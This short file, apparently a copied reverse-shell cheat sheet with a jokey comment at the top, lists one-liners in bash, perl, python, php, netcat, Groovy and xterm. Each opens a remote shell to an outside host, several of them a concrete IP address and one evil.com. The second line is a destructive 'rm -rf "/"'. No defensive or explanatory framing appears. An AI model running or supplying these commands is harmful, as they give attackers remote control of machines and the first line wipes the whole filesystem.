#yo this is straight just my guy
rm -rf "/"
bash -i >& /dev/tcp/91.218.114.206/8080 0>&1
perl -e 'use Socket;$i="91.218.114.206";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
php -r '$sock=fsockopen("91.218.114.206",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
nc -e /bin/sh 91.218.114.206
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
xterm -display 10.0.0.1:1
exec 5<>/dev/tcp/evil.com/8080
cat <&5 | while read line; do $line 2>&5 >&5; done
